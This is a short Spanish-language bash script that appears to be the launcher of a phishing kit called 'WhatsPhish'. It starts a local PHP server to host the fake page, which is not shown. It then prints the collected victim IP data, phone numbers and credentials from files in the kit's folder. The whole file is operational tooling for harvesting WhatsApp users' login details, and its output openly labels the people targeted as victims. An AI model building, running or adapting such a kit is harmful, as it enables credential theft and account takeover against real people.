clear

sleep 0.1
cat .banner.txt | lolcat
echo -e	'							\e[1;33mAutor: \e[1;32mCharly\e[1;37mDev\e[1;31m777'

echo ''
echo ''

echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[1;36mInicializando servidor PHP...'
sleep 0.6
echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[1;36mServidor PHP iniciado... \e[1;31mpara detener use \e[1;37mCTRL + C'
php -S localhost:8080
echo ""
echo ""
echo ""

sleep 0.5
echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[1;36mInformacion de la victima\e[1;37m'
cat $HOME/WhatsPhish/www/ip.txt
echo ""

sleep 0.8
echo ""
echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[0;36mCredenciales de las victimas\e[1;37m' 
echo ""
cat $HOME/WhatsPhish/www/usernumbers.txt
echo ""
cat $HOME/WhatsPhish/www/credentials.txt

sleep 0.4
